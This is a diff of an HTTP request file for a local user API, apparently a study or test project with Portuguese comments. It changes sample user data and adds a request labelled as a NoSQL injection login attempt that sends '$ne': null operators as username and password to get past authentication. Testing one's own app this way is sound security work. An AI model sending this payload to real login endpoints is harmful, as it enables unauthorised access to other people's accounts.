@@ -3,9 +3,9 @@ POST http://localhost:3000/api/users
 Content-Type: application/json
 
 {
-  "username": "joao",
-  "email": "joao@email.com",
-  "password": "123456"
+  "username": "Maria",
+  "email": "maria@email.com",
+  "password": "11111"
 }
 
 
@@ -24,3 +24,13 @@ Content-Type: application/json
 
 ### Deletar usuário
 DELETE http://localhost:3000/api/users/<ID_DO_USUARIO>
+
+
+### NoSQL Injection - Tentativa de login sem saber a senha
+POST http://localhost:3000/api/login
+Content-Type: application/json
+
+{
+  "username": { "$ne": null },
+  "password": { "$ne": null }
+}
